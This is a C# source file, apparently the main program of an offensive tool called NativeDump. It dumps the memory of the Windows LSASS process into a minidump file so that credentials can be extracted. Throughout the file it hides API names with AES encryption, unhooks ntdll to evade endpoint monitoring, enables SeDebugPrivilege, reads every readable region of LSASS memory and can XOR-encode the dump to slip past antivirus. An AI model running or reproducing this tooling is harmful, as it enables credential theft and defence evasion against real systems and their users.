using System;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using static NativeDump.CreateFile;
using static NativeDump.Overwrite;


namespace NativeDump
{
    internal class Program
    {
        const string strings_aes_password = "NativeDump-AESPW";
        const string strings_aes_iv = "NativeDump-AESIV";
        
        static void EnableDebugPrivileges(IntPtr ntdll_address)
        {
            string NtOpenProcessToken_decrypted = DecryptStringFromBytes("dVNokQ+FGYftPDVugpCgRXqa8lkYzmmEEI//QbdIAz4=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtAdjustPrivilegesToken_decrypted = DecryptStringFromBytes("CHR0P/PWNpc67F9qlSlB83dVpJFKV+q5v8RGncCJkKE=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtClose_decrypted = DecryptStringFromBytes("EHbfTz/nCV1Haj37b77KoA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;

            try
            {
                NtOpenProcessTokenDelegate NtOpenProcessTokenFunction = (NtOpenProcessTokenDelegate)GetFuncDelegate(ntdll_address, NtOpenProcessToken_decrypted, typeof(NtOpenProcessTokenDelegate));
                uint ntstatus = NtOpenProcessTokenFunction(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling " + NtOpenProcessToken_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                NtAdjustPrivilegesTokenDelegate NtAdjustPrivilegesTokenFunction = (NtAdjustPrivilegesTokenDelegate)GetFuncDelegate(ntdll_address, NtAdjustPrivilegesToken_decrypted, typeof(NtAdjustPrivilegesTokenDelegate));
                ntstatus = NtAdjustPrivilegesTokenFunction(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling " + NtAdjustPrivilegesToken_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to run the program as administrator or calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtCloseDelegate NtCloseFunction = (NtCloseDelegate)GetFuncDelegate(ntdll_address, NtClose_decrypted, typeof(NtCloseDelegate));
                    NtCloseFunction(tokenHandle);
                }
            }
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address, IntPtr ntdll_address)
        {
            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            byte[] buff = new byte[8];
            NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
            uint ntstatus = NtReadVirtualMemoryFunction(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address, IntPtr ntdll_address)
        {
            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            byte[] buff = new byte[256];
            NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
            uint ntstatus = NtReadVirtualMemoryFunction(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name, IntPtr ntdll_address)
        {
            string NtQueryInformationProcess_decrypted = DecryptStringFromBytes("p74LC9QWA6qihXsxRK3d4v59VByqTa1cLrM5KZIVkw0=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));

            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_offset = 0x50;
            // If 32-bit process these offsets change
            if (IntPtr.Size == 4)
            {
                process_basic_information_size = 24;
                peb_offset = 0x4;
                ldr_offset = 0x0c;
                inInitializationOrderModuleList_offset = 0x1c;
                flink_dllbase_offset = 0x18;
                flink_buffer_offset = 0x30;
            }

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                NtQueryInformationProcessDelegate NtQueryInformationProcessFunction = (NtQueryInformationProcessDelegate)GetFuncDelegate(ntdll_address, NtQueryInformationProcess_decrypted, typeof(NtQueryInformationProcessDelegate));
                uint ntstatus = NtQueryInformationProcessFunction(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling " + NtQueryInformationProcess_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer, ntdll_address);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList, ntdll_address);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset), ntdll_address);
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset), ntdll_address);

                string base_dll_name = ReadRemoteWStr(hProcess, buffer, ntdll_address);

                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10), ntdll_address);

                // Compare with DLL name we are searching
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }
            return IntPtr.Zero;
        }


        public static OSVERSIONINFOEX getBuildNumber(IntPtr ntdll_address)
        {
            string RtlGetVersion_decrypted = DecryptStringFromBytes("/fYVPzm2XqW04lyEgBdrwg==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            RtlGetVersionDelegate RtlGetVersionFunction = (RtlGetVersionDelegate)GetFuncDelegate(ntdll_address, RtlGetVersion_decrypted, typeof(RtlGetVersionDelegate));
            RtlGetVersionFunction(ref osVersionInfo);
            return osVersionInfo;
        }


        static void Main(string[] args)
        {
            // Defaut values
            bool xor_bytes_bool = false;
            byte xor_byte = 0xCC;

            string ntdll_decrypted = DecryptStringFromBytes("HSUNIBVhlw/Rk7hngQFg6Q==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv)); // public static void EncryptAux(string str_to_encrypt){Console.WriteLine("string "+ str_to_encrypt + "_decrypted = DecryptStringFromBytes(\"" + EncryptStringToBytes(str_to_encrypt, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv)) + "\", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));");}
            string lsass_decrypted = DecryptStringFromBytes("AQwDh64onS02pqrocuqyTA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string lsasrv_dll_decrypted = DecryptStringFromBytes("kQ1NposSj/OgUkeDH6CU9w==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtOpenProcess_decrypted = DecryptStringFromBytes("EKXSHKj6YzOcq7il7O6t3Q==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtQueryVirtualMemory_decrypted = DecryptStringFromBytes("/rOhe8ZGE+i5znQHLz3fdnOKYN5OKp9IXyQPntuI+sk=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            string NtClose_decrypted = DecryptStringFromBytes("EHbfTz/nCV1Haj37b77KoA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            
            // Overwrite ntdll.dll hooked APIs with unhooked versions
            PatchNtdll();

            // Get process name
            string procname = lsass_decrypted;

            // Get ntdll address
            IntPtr ntdll_address = GetLibAddress(ntdll_decrypted);

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges(ntdll_address);

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            NtOpenProcessDelegate NtOpenProcessFunction = (NtOpenProcessDelegate)GetFuncDelegate(ntdll_address, NtOpenProcess_decrypted, typeof(NtOpenProcessDelegate));
            uint ntstatus = NtOpenProcessFunction(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling " + NtOpenProcess_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            byte[] memory_regions = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();

            // Get lsasrv.dll information
            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, lsasrv_dll_decrypted, ntdll_address);
            int lsasrvdll_size = 0;
            bool bool_test = false;

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemoryDelegate NtQueryVirtualMemoryFunction = (NtQueryVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtQueryVirtualMemory_decrypted, typeof(NtQueryVirtualMemoryDelegate));
                ntstatus = NtQueryVirtualMemoryFunction(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling " + NtQueryVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                }

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
                    ntstatus = NtReadVirtualMemoryFunction(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    if (ntstatus != 0 && ntstatus != 0x8000000D)
                    {
                        Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                    }
                    byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                    Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                    memory_regions = new_bytearray;

                    // Calculate size of lsasrv.dll region
                    if (mbi.BaseAddress == lsasrvdll_address)
                    {
                        bool_test = true;
                    }
                    if (bool_test == true)
                    {
                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
                        {
                            bool_test = false;
                        }
                        else
                        {
                            lsasrvdll_size += (int)mbi.RegionSize;
                        }
                    }
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            // Get file name
            string dumpfile = "proc_" + processPID + ".dmp";
            if (args.Length > 0)
            {
                dumpfile = args[0];
            }
            if (args.Length > 1)
            {
                if (args[1] == "xor")
                {
                    xor_bytes_bool = true;
                }
            }

            // Generate Minidump file
            OSVERSIONINFOEX osVersionInfo = getBuildNumber(ntdll_address);
            Console.WriteLine("[+] " + lsasrv_dll_decrypted + " Address:\t\t\t\t0x" + lsasrvdll_address.ToString("X"));
            Console.WriteLine("[+] " + lsasrv_dll_decrypted + " Size:   \t\t\t\t0x" + lsasrvdll_size.ToString("X"));
            CreateMinidump(lsasrvdll_address, lsasrvdll_size, lsasrv_dll_decrypted, mem64info_List, memory_regions, dumpfile, osVersionInfo, xor_bytes_bool, xor_byte);

            // Close process handle
            NtCloseDelegate NtCloseFunction = (NtCloseDelegate)GetFuncDelegate(ntdll_address, NtClose_decrypted, typeof(NtCloseDelegate));
            ntstatus = NtCloseFunction(processHandle);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling " + NtClose_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
        }
    }
}